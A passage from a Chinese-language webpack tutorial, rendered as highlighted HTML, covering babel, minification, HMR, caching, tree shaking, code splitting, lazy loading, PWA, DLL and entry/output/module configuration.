class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rules</span>: [ </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.js$/</span>, </span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, </span><br><span class="line">        <span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>, </span><br><span class="line">        <span class="attr">options</span>: &#123; </span><br><span class="line">            <span class="comment">// 预设：指示 babel 做怎么样的兼容性处理 </span></span><br><span class="line">            <span class="attr">presets</span>: [ </span><br><span class="line">                [ <span class="string">&#x27;@babel/preset-env&#x27;</span>, </span><br><span class="line">                 &#123; </span><br><span class="line">                     <span class="comment">// 按需加载 </span></span><br><span class="line">                     <span class="attr">useBuiltIns</span>: <span class="string">&#x27;usage&#x27;</span>, </span><br><span class="line">                     <span class="comment">// 指定 core-js 版本 </span></span><br><span class="line">                     <span class="attr">corejs</span>: &#123; <span class="attr">version</span>: <span class="number">3</span> &#125;,</span><br><span class="line">                     <span class="comment">// 指定兼容性做到哪个版本浏览器 </span></span><br><span class="line">                     <span class="attr">targets</span>: &#123; <span class="attr">chrome</span>: <span class="string">&#x27;60&#x27;</span>, <span class="attr">firefox</span>: <span class="string">&#x27;60&#x27;</span>, <span class="attr">ie</span>: <span class="string">&#x27;9&#x27;</span>, <span class="attr">safari</span>: <span class="string">&#x27;10&#x27;</span>, <span class="attr">edge</span>: <span class="string">&#x27;17&#x27;</span> &#125; </span><br><span class="line">                 &#125; </span><br><span class="line">                ] </span><br><span class="line">            ] </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="2.6-js压缩">2.6 js压缩<a title="#2.6-js压缩" href="#2.6-js压缩"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生产环境下会自动压缩 js 代码 </span></span><br><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;production&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2.7-html压缩">2.7 html压缩<a title="#2.7-html压缩" href="#2.7-html压缩"></a></h3><p>webpack5也能压缩html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins</span>: [ </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123; </span><br><span class="line">        <span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span>, </span><br><span class="line">        <span class="comment">// 压缩 html 代码 </span></span><br><span class="line">        <span class="attr">minify</span>: &#123; </span><br><span class="line">            <span class="comment">// 移除空格 </span></span><br><span class="line">            <span class="attr">collapseWhitespace</span>: <span class="literal">true</span>, </span><br><span class="line">            <span class="comment">// 移除注释 </span></span><br><span class="line">            <span class="attr">removeComments</span>: <span class="literal">true</span> </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;) </span><br><span class="line">],</span><br><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;production&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3.-webpack优化配置">3. webpack优化配置<a title="#3.-webpack优化配置" href="#3.-webpack优化配置"></a></h2><h3 id="3.1-hmr">3.1 HMR<a title="#3.1-hmr" href="#3.1-hmr"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>, </span><br><span class="line"><span class="attr">devServer</span>: &#123; </span><br><span class="line">    <span class="attr">contentBase</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>), </span><br><span class="line">    <span class="attr">compress</span>: <span class="literal">true</span>, </span><br><span class="line">    <span class="attr">port</span>: <span class="number">3000</span>, </span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>, </span><br><span class="line">    <span class="comment">// 开启 HMR 功能 </span></span><br><span class="line">    <span class="comment">// 当修改了 webpack 配置，新配置要想生效，必须重新 webpack 服务 </span></span><br><span class="line">        <span class="attr">hot</span>: <span class="literal">true</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.2-source-map">3.2 <strong>source-map</strong><a title="#3.2-source-map" href="#3.2-source-map"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devtool</span>: <span class="string">&#x27;eval-source-map&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3.3-oneof">3.3 OneOf<a title="#3.3-oneof" href="#3.3-oneof"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下 loader 只会匹配一个 // 注意：不能有两个配置处理同一种类型文件 </span></span><br><span class="line"><span class="attr">oneOf</span>: [</span><br><span class="line">    ..处理css less img js...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="3.4-缓存">3.4 缓存<a title="#3.4-缓存" href="#3.4-缓存"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">正常来讲，一个文件只能被一个 loader 处理。 </span></span><br><span class="line"><span class="comment">当一个文件要被多个 loader 处理，那么一定要指定 loader 执行的先后顺序： </span></span><br><span class="line"><span class="comment">先执行 eslint 在执行 babel </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#123; </span><br><span class="line">       <span class="attr">test</span>: <span class="regexp">/\.js$/</span>, </span><br><span class="line">       <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, </span><br><span class="line">       <span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>, </span><br><span class="line">       <span class="attr">options</span>: &#123; </span><br><span class="line">           <span class="comment">// 预设：指示 babel 做怎么样的兼容性处理 </span></span><br><span class="line">           <span class="attr">presets</span>: [ </span><br><span class="line">               [ <span class="string">&#x27;@babel/preset-env&#x27;</span>, </span><br><span class="line">                &#123; </span><br><span class="line">                    <span class="comment">// 按需加载 </span></span><br><span class="line">                    <span class="attr">useBuiltIns</span>: <span class="string">&#x27;usage&#x27;</span>, </span><br><span class="line">                    <span class="comment">// 指定 core-js 版本 </span></span><br><span class="line">                    <span class="attr">corejs</span>: &#123; <span class="attr">version</span>: <span class="number">3</span> &#125;,</span><br><span class="line">                    <span class="comment">// 指定兼容性做到哪个版本浏览器 </span></span><br><span class="line">                    <span class="attr">targets</span>: &#123; <span class="attr">chrome</span>: <span class="string">&#x27;60&#x27;</span>, <span class="attr">firefox</span>: <span class="string">&#x27;60&#x27;</span> &#125; </span><br><span class="line">                &#125; </span><br><span class="line">               ] </span><br><span class="line">           ],</span><br><span class="line">           <span class="comment">// 开启 babel 缓存 </span></span><br><span class="line">           <span class="comment">// 第二次构建时，会读取之前的缓存 </span></span><br><span class="line">           <span class="attr">cacheDirectory</span>: <span class="literal">true</span></span><br><span class="line">       &#125; </span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><h3 id="3.5-tree-shaking-树摇">3.5 tree shaking 树摇<a title="#3.5-tree-shaking-树摇" href="#3.5-tree-shaking-树摇"></a></h3><p>前提：必须使用 es6 模块化   开启 production 环境</p><p>作用：减少代码体积</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.json</span></span><br><span class="line"><span class="comment">//所有代码都没有副作用 都可以进行树摇</span></span><br><span class="line"><span class="comment">//问题：可能会把 css/ @babel/polyfill 文件干掉</span></span><br><span class="line"><span class="attr">&quot;sideEffects&quot;</span><span class="punctuation">:</span><span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//对数组里的文件会忽略该操作</span></span><br><span class="line"><span class="attr">&quot;sideEffects&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;*.css&quot;</span><span class="punctuation">,</span><span class="string">&quot;*.less&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><h3 id="3.6-code-spilt-代码分割">3.6 code spilt 代码分割<a title="#3.6-code-spilt-代码分割" href="#3.6-code-spilt-代码分割"></a></h3><ol><li><p>利用多入口  打包成多个js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entry</span>:&#123;</span><br><span class="line">   <span class="attr">index</span>: ’./src/js/index.<span class="property">js</span>’,</span><br><span class="line">   <span class="attr">test</span>: ’./src/js/test.<span class="property">js</span>’</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>单/多入口 与 optimization 配合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entry</span>: ‘./src/index.<span class="property">js</span>’,</span><br><span class="line"><span class="comment">// 或者 多入口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 可以将node_modules中代码单独打包一个chunk最终输出</span></span><br><span class="line"><span class="comment">//2. 自动分析多入口chunk中，有无公共文件 if有 就会打包成单独一个chunk</span></span><br><span class="line"><span class="attr">optimization</span>:&#123;</span><br><span class="line"><span class="attr">splitChunks</span>:&#123;</span><br><span class="line"><span class="attr">chunk</span>: ’all’</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在单入口 与 optimization 配合 页面的 js 文件里面使用 import</p><p>通过js代码，让某某个文件被单独打包成一个chunk</p><p>import 动态导入语法：能将某个文件单独打包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /* webpackChunkName: &#x27;test&#x27; */ webpack.config.js 中 的[name] == test</span></span><br><span class="line"><span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &#x27;test&#x27; */</span><span class="string">&#x27;./test&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">&#123;mul,count&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//文件加载成功</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//文件加载失败</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="3.7-lazy-loading">3.7 <strong>lazy loading</strong><a title="#3.7-lazy-loading" href="#3.7-lazy-loading"></a></h3><p>懒加载：文件需要使用是才加载</p><p>预加载 prefetch：使用之前 提前记载js文件  等其他资源加载完毕 浏览器空闲了 再偷偷加载</p><p>eg</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//懒加载</span></span><br><span class="line">    <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &#x27;test&#x27; */</span><span class="string">&#x27;./test&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">&#123;mul,count&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//文件加载成功</span></span><br><span class="line">&#125;)</span><br><span class="line">    <span class="comment">//预加载</span></span><br><span class="line">    <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &#x27;test&#x27; , webpackPrefetch: true */</span><span class="string">&#x27;./test&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">&#123;mul,count&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//文件加载成功</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.8-pwa">3.8 pwa<a title="#3.8-pwa" href="#3.8-pwa"></a></h3><p>现在好像已经被淘汰了</p><p>pwa 渐进式网络开发应用程序  离线可访问</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">WorkboxWebpackPlugin</span>.<span class="property">GenerateSW</span>&#123;</span><br><span class="line">    <span class="comment">//1.帮助serviceworker快速启动</span></span><br><span class="line">    <span class="comment">//2.删除旧的 serviceworker</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//生成一个serviceworker 配置文件</span></span><br><span class="line">    <span class="attr">clicentsClaim</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">skipWaiting</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="comment">//注册 serviceWorker</span></span><br><span class="line"><span class="comment">//处理兼容性问题</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;serviceWorke&#x27;</span> <span class="keyword">in</span> navigator)&#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">onload</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        navigator.<span class="property">serviceWorker</span></span><br><span class="line">        .<span class="title function_">register</span>(<span class="string">&#x27;/service-worker.js&#x27;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&#x27;成功&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">&#x27;失败&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为eslint不认识 window navigator全局变量</span></span><br><span class="line"><span class="comment">//解决 需要修改 package.json eslintConfig 配置</span></span><br><span class="line"><span class="string">&quot;env&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;browser&quot;</span>:<span class="literal">true</span> <span class="comment">//支持浏览器端全局变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sw 必须运行在服务器上</p><ul><li><p>nodejs</p></li><li><p>npm i serve -g</p><p>serve -s build 启动服务器 将build目录的所有资源 作为静态资源暴露出去</p></li></ul><h3 id="3.9-多进程打包">3.9 多进程打包<a title="#3.9-多进程打包" href="#3.9-多进程打包"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="attr">test</span>: <span class="regexp">/\.js$/</span>, </span><br><span class="line">    <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, </span><br><span class="line">    <span class="attr">use</span>: [&#123;</span><br><span class="line">        <span class="comment">/*开启多进程打包。 </span></span><br><span class="line"><span class="comment">        进程启动大概为 600ms，进程通信也有开销。 </span></span><br><span class="line"><span class="comment">        只有工作消耗时间比较长，才需要多进程打包 */</span> </span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;thread-loader&#x27;</span>, </span><br><span class="line">            <span class="attr">options</span>: &#123; </span><br><span class="line">                <span class="attr">workers</span>: <span class="number">2</span> <span class="comment">// 进程 2 个 </span></span><br><span class="line">             &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.10-externals">3.10 <strong>externals</strong><a title="#3.10-externals" href="#3.10-externals"></a></h3><p>不打包 jquery 然后 在html 手动引入cdn</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;production&#x27;</span>, </span><br><span class="line"><span class="attr">externals</span>: &#123; </span><br><span class="line">    <span class="comment">// 拒绝 jQuery 被打包进来 </span></span><br><span class="line">    <span class="attr">jquery</span>: <span class="string">&#x27;jQuery&#x27;</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.11-dll">3.11 dll<a title="#3.11-dll" href="#3.11-dll"></a></h3><p>使用dll 对某些 第三方库 进行单独打包</p><ul><li>运行webpack 时 默认查找webpack.config.js</li><li>所以运行 改文件应 <code>webpack --config webpack.dll.js</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.dll.js</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&quot;webpack&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="attr">entry</span>:&#123;</span><br><span class="line">    <span class="comment">//最终打包生成的[name] = jquery</span></span><br><span class="line">    <span class="comment">//[&#x27;jquery&#x27;] = 要打包的库</span></span><br><span class="line">    <span class="attr">jquery</span>:[<span class="string">&#x27;jquery&#x27;</span>]</span><br><span class="line">&#125;，</span><br><span class="line"><span class="attr">output</span>:&#123;</span><br><span class="line">    <span class="attr">filename</span>:<span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="title function_">resolve</span>(__dirname,<span class="string">&#x27;dll&#x27;</span>),  <span class="comment">//打包后的位置</span></span><br><span class="line">    <span class="attr">library</span>:<span class="string">&#x27;[name]_[hash]&#x27;</span>  <span class="comment">//打包的库里面向外暴露出去的内容的名字</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">plugins</span>:[</span><br><span class="line">    <span class="comment">// 告诉webpack 不用再打包了</span></span><br><span class="line">    <span class="comment">//打包生成一个manifest.js  提供和jq 的映射</span></span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">DllPlugin</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;[name]_[hash]&#x27;</span>,  <span class="comment">//映射库的暴露内容名称</span></span><br><span class="line">        <span class="attr">path</span>:<span class="title function_">resolve</span>(__dirname,<span class="string">&#x27;dll/nanifest.json&#x27;</span>)  <span class="comment">//输出文件路径</span></span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后再运行webpack 就不会再重复打包jq了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"><span class="attr">plugins</span>: [ </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123; <span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span> &#125;), </span><br><span class="line">    <span class="comment">// 告诉 webpack 哪些库不参与打包，同时使用时的名称也得变~ </span></span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">DllReferencePlugin</span>(&#123; </span><br><span class="line">        <span class="attr">manifest</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dll/manifest.json&#x27;</span>) </span><br><span class="line">    &#125;), </span><br><span class="line">    <span class="comment">// 将某个文件打包输出去，并在 html 中自动引入该资源 </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AddAssetHtmlWebpackPlugin</span>(&#123; </span><br><span class="line">        <span class="attr">filepath</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dll/jquery.js&#x27;</span>) </span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="3.12-优化总结">3.12 优化总结<a title="#3.12-优化总结" href="#3.12-优化总结"></a></h3><ol><li><p>开发环境性能优化</p><ul><li><p>优化打包构建速度</p><p>HMR</p></li><li><p>优化代码调试</p><p>source-map</p></li></ul></li><li><p>生成环境性能优化</p><ul><li><p>优化打包构建速度</p><p>OneOf</p><p>babel缓存</p><p>多进程打包</p><p>externals</p><p>dll</p></li><li><p>优化代码运行的性能</p><p>缓存(hash–chunkhash–contenthash)</p><p>tree shaking</p><p>code split</p><p>懒加载/预加载</p><p>pwa</p></li></ul></li></ol><h2 id="4.-webpack-配置详情">4. webpack 配置详情<a title="#4.-webpack-配置详情" href="#4.-webpack-配置详情"></a></h2><h3 id="4.1-entry">4.1 entry<a title="#4.1-entry" href="#4.1-entry"></a></h3><p>入口起点</p><ol><li><p>String  -&gt; ‘./src/index.js’</p><p>单入口  打包形成一个chunk 输出一个 bundle 文件</p><p>chunk 名称默认是 main</p></li><li><p>array  –&gt; [‘./src/index.js’, ‘./src/add.js’]</p><p>多入口  所有入口文件形成一个chunk 输出一个 bundle 文件</p></li><li><p>object  -&gt; { index : ‘./src/index.js’, add:  ‘./src/add.js’ }</p><p>多入口 几个入口就几个chunk 输出几个bundle</p><p>chunk 名称为 key值</p></li><li><p>特殊用法</p><p>{</p><p>​ index :[‘./src/index.js’, ‘./src/add.js’],    //一个chunk 一个bundle</p><p>​ add:  ‘./src/add.js’    //一个chunk 一个bundle</p><p>}</p></li></ol><h3 id="4.2-output">4.2 output<a title="#4.2-output" href="#4.2-output"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">output</span>: &#123; </span><br><span class="line">    <span class="comment">// 文件名称（指定名称+目录） </span></span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&#x27;js/[name].js&#x27;</span>, </span><br><span class="line">    <span class="comment">// 输出文件目录（将来所有资源输出的公共目录） </span></span><br><span class="line">    <span class="attr">path</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>), </span><br><span class="line">    <span class="comment">// 所有资源引入公共路径前缀 --&gt; &#x27;imgs/a.jpg&#x27; --&gt; &#x27;/imgs/a.jpg&#x27; </span></span><br><span class="line">    <span class="attr">publicPath</span>: <span class="string">&#x27;/&#x27;</span>, </span><br><span class="line">    <span class="attr">chunkFilename</span>: <span class="string">&#x27;js/[name]_chunk.js&#x27;</span>, <span class="comment">// 非入口 chunk 的名称 </span></span><br><span class="line">    <span class="comment">// library: &#x27;[name]&#x27;, // 整个库向外暴露的变量名 </span></span><br><span class="line">    <span class="comment">// libraryTarget: &#x27;window&#x27; // 变量名添加到哪个上 browser </span></span><br><span class="line">    <span class="comment">// libraryTarget: &#x27;global&#x27; // 变量名添加到哪个上 node </span></span><br><span class="line">    <span class="comment">// libraryTarget: &#x27;commonjs&#x27; </span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="4.3-module">4.3 module<a title="#4.3-module" href="#4.3-module"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">module</span>: &#123; </span><br><span class="line">    <span class="attr">rules</span>: [ </span><br><span class="line">    <span class="comment">// loader 的配置 </span></span><br><span class="line">        &#123; </span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, </span><br><span class="line">            <span class="comment">// 多个 loader 用 use</span></span><br><span class="line">            <span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>] </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123; </span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.js$/</span>, </span><br><span class="line">            <span class="comment">// 排除 node_modules 下的 js 文件 </span></span><br><span class="line">            <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, </span><br><span class="line">            <span class="comment">// 只检查 src 下的 js 文件 </span></span><br><span class="line">            <span class="attr">include</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src&#x27;</span>), </span><br><span class="line">            <span class="comment">// 优先执行 enforce: &#x27;pre&#x27;, </span></span><br><span class="line">            <span class="comment">// 延后执行 // enforce: &#x27;post&#x27;, </span></span><br><span class="line">            <span class="comment">// 单个 loader 用 loader </span></span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;eslint-loader&#x27;</span>, </span><br><span class="line">            <span class="attr">options</span>: &#123;&#125; </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123; </span><br><span class="line">            <span class="comment">// 以下配置只会生效一个 </span></span><br><span class="line">            <span class="attr">oneOf</span>: [] </span><br><span class="line">        &#125; </span><br><span class="line">    ] </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="4.4-resolve">4.4 resolve<a title="#4.4-resolve" href="#4.4-resolve"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resolve</span>: &#123; </span><br><span class="line">    <span class="comment">// 配置解析模块路径别名: 优点简写路径 缺点路径没有提示 </span></span><br><span class="line">    